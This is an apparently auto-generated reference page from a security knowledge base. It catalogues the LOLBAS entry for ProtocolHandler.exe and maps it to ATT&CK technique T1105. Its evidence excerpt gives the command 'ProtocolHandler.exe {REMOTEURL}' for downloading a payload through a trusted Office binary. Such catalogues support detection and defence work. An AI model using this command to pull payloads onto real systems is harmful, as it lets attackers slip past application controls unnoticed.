---
parsed_by: focuslocust
source: lolbas
type: generated
---
# ProtocolHandler.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `protocolhandler.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/ProtocolHandler.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft Office binary

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/protocolhandler.md)
- Source verification: [source record](../../sources/lolbas/protocolhandler.exe.md)

## Aliases

- `ProtocolHandler.exe`
- `protocolhandler.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: ProtocolHandler.exe {REMOTEURL} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/protocolhandler.exe.md)

## Source Verification

[source record](../../sources/lolbas/protocolhandler.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@C_h4ck_0'
Person: Nir Chako (Pentera)
Author: Nir Chako
Commands:
- Category: Download
Command: ProtocolHandler.exe {REMOTEURL}
Description: Downloads payload from remote server
```
